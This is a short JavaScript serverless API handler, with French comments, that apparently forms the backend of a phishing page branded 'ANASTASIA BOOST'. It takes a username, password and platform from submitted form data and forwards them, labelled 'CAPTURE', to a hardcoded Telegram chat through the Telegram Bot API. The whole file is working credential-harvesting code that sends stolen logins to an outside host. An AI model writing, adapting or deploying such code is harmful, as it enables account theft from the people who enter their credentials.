export default async function handler(req, res) {
    const { user, pass, platform } = req.body;
    const BOT_TOKEN = process.env.TELEGRAM_TOKEN;
    const CHAT_ID = "6224971749"; // Ton ID d'après la capture

    const text = `🚀 **ANASTASIA BOOST : CAPTURE** 🚀\n` +
                 `━━━━━━━━━━━━━━━━━━\n` +
                 `🌐 **PLATEFORME** : ${platform}\n` +
                 `👤 **USER** : \`${user}\`\n` +
                 `🔑 **PASS** : \`${pass}\`\n` +
                 `━━━━━━━━━━━━━━━━━━\n` +
                 `📍 *Réception en temps réel - 1ère A2*`;

    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown" })
        });
        res.status(200).json({ success: true });
    } catch (e) { res.status(500).json({ error: "Erreur" }); }
}
